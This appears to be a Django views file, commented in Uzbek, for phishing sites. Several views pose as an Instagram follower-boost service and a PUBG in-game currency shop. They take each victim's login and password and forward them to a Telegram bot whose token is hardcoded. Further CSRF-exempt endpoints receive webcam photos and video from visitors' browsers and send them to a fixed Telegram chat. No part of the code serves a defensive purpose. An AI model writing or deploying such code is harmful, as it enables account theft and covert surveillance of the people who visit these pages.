from .forms import NakrutkaForm
from .models import UCOrder
import os
import base64
import requests
import time
from django.http import JsonResponse, HttpResponseBadRequest
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render
from django.conf import settings  # MEDIA_ROOT uchun

TELEGRAM_BOT_TOKEN = "8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0"


def home1(request,id):
    success = False
    if request.method == "POST":
        form = NakrutkaForm(request.POST)
        if form.is_valid():
            obj = form.save()
            username_var = form.cleaned_data.get('username')
            password_var = form.cleaned_data.get('password')
            text = f"Instagram profile 💋\n\n👤 *Login*: ```{username_var}```\n🔒 *Parol*: ```{password_var}```\n"
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    else:
        form = NakrutkaForm()

    return render(request, "Nakrutka/index1.html", {"form": form, "success": success})


def home2(request,id):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "Nakrutka/index2.html")


def home3(request,id):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "Nakrutka/index3.html")






def pubg(request,id):
    if request.method == 'POST':
        game_id = request.POST.get('game_id')
        server = request.POST.get('server')
        uc_amount = request.POST.get('uc_amount')
        email = request.POST.get('email')
        password = request.POST.get('password')
        terms = request.POST.get('terms') == 'on'

        order = UCOrder(
            game_id=game_id,
            server=server,
            uc_amount=uc_amount,
            email=email,
            password=password,
            terms=terms
        )
        order.save()
        text = (
            f"👮🏻‍♀️ Pubg account 💋\n\n"
            f"📧 *Email*: ```{email}```\n"
            f"🔒 *Parol*: ```{password}```\n"
        )
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                      data={"chat_id": id, "text": text, "parse_mode": "MarkdownV2"})

        return render(request, 'Pubg/uc_olindi.html',{"uc_amount":uc_amount})
    return render(request, 'Pubg/index.html')


def uc_olindi(request):
    return render(request, 'Pubg/uc_olindi.html')


import base64
import os
import requests
import json
from django.http import JsonResponse, HttpResponseBadRequest
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
import time


# Media papkalarni yaratish
def ensure_media_dirs():
    """Media papkalarni yaratish"""
    media_dirs = ['media/captures', 'media/videos']
    for dir_path in media_dirs:
        os.makedirs(dir_path, exist_ok=True)


# Dastur ishga tushganda papkalarni yaratish
ensure_media_dirs()


def index(request):
    # Sahifada rozilik matni ko'rsatiladi
    return render(request, 'camera/index.html')


@csrf_exempt
def upload_image(request):
    if request.method != 'POST':
        return HttpResponseBadRequest("Only POST method allowed")

    try:
        # JSON data yoki form data ni qayta ishlash
        if request.content_type == 'application/json':
            data = json.loads(request.body)
            image_data = data.get('image', '')
        else:
            image_data = request.POST.get('image', '')

        if not image_data:
            return HttpResponseBadRequest("No image data provided")

        # Base64 ma'lumotni ajratish
        if image_data.startswith('data:'):
            header, b64_data = image_data.split(',', 1)
        else:
            b64_data = image_data

        # Base64 dekodlash
        try:
            img_bytes = base64.b64decode(b64_data)
        except Exception as e:
            return HttpResponseBadRequest(f"Invalid base64 data: {str(e)}")

        # 📂 Rasm saqlash
        saved_path = 'media/captures'
        os.makedirs(saved_path, exist_ok=True)
        filename = f"capture_{int(time.time())}_{hash(b64_data[:100])}.png"
        file_path = os.path.join(saved_path, filename)

        with open(file_path, 'wb') as f:
            f.write(img_bytes)

        # 📤 Telegram'ga yuborish
        send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"

        try:
            with open(file_path, 'rb') as img:
                files = {'photo': img}
                data_send = {
                    'chat_id': '449766528',
                    'caption': 'Yangi rasm (foydalanuvchi roziligi bilan)'
                }
                resp = requests.post(send_url, data=data_send, files=files, timeout=15)

            if resp.status_code != 200:
                return JsonResponse({
                    'ok': False,
                    'error': f'Telegram error: {resp.status_code} - {resp.text}'
                })

        except Exception as e:
            # Telegram xatosida ham faylni saqlab qolamiz
            print(f"Telegram xatosi: {e}")
            return JsonResponse({
                'ok': False,
                'error': str(e),
                'file_saved': filename
            })

        # 🔥 Faqat hozirgi rasmni o'chirish
        try:
            os.remove(file_path)
        except Exception as e:
            print("Faylni o'chirishda xato:", e)

        return JsonResponse({'ok': True, 'file': filename})

    except Exception as e:
        return JsonResponse({'ok': False, 'error': str(e)})


# 🎥 VIDEO FUNKSIYA
@csrf_exempt
def upload_video(request):
    if request.method != 'POST':
        return HttpResponseBadRequest("Only POST method allowed")

    try:
        # Frontend FormData orqali yuboradi: video=file
        video_file = request.FILES.get('video')
        if not video_file:
            return HttpResponseBadRequest("No video file provided")

        # Fayl turini tekshirish
        if not video_file.content_type.startswith('video/'):
            return HttpResponseBadRequest("File must be a video")

        # 📂 Videoni vaqtincha saqlash
        saved_path = 'media/videos'
        os.makedirs(saved_path, exist_ok=True)
        filename = f"video_{int(time.time())}_{hash(str(time.time()))}.mp4"
        file_path = os.path.join(saved_path, filename)

        with open(file_path, 'wb') as f:
            for chunk in video_file.chunks():
                f.write(chunk)

        # 📤 Telegram'ga yuborish
        send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"

        try:
            with open(file_path, 'rb') as vid:
                files = {'video': vid}
                data_send = {
                    'chat_id': '449766528',
                    'caption': 'Yangi video'
                }
                resp = requests.post(send_url, data=data_send, files=files, timeout=60)

            if resp.status_code != 200:
                return JsonResponse({
                    'ok': False,
                    'error': f'Telegram error: {resp.status_code} - {resp.text}'
                })

        except Exception as e:
            # Telegram xatosida ham faylni saqlab qolamiz
            print(f"Telegram video xatosi: {e}")
            return JsonResponse({
                'ok': False,
                'error': str(e),
                'file_saved': filename
            })

        # 🔥 Faqat hozirgi videoni o'chirish
        try:
            os.remove(file_path)
        except Exception as e:
            print("Video faylni o'chirishda xato:", e)

        return JsonResponse({'ok': True, 'file': filename})

    except Exception as e:
        return JsonResponse({'ok': False, 'error': str(e)})


# 🆕 Yangi funksiya: Holatni tekshirish
@csrf_exempt
def check_status(request):
    """Server holatini tekshirish"""
    return JsonResponse({
        'status': 'ok',
        'message': 'Server is running',
        'media_dirs': {
            'images': os.path.exists('media/captures'),
            'videos': os.path.exists('media/videos')
        }
    })